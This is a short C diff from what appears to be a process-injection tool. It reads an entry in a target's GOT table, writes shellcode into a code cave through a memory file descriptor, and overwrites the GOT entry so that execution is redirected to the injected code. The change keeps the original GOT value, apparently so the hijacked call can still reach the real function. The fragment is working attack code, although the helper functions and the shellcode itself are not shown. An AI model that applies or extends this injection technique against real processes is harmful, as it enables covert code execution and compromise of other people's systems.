@@ -104,15 +104,18 @@ int main(int argc, char** argv) {
   generate_got_table(table);
   populate_got_table(table, got, fd_mem);
 
+  int* overwrite = malloc(sizeof(int));
+  overwrite = read_got_table(table, overwrite);
+
   /*
    * Step 6
    */
-  write_to_cave(code_cave, shell_code, sc_size, fd_mem);
+  write_to_cave(code_cave, shell_code, sc_size, fd_mem, table, overwrite);
 
   /*
    * Step 7
    */
-  overwrite_got_entry(table, code_cave, fd_mem);
+  overwrite_got_entry(table, code_cave, fd_mem, overwrite);
 
   free(fd_mem);
 
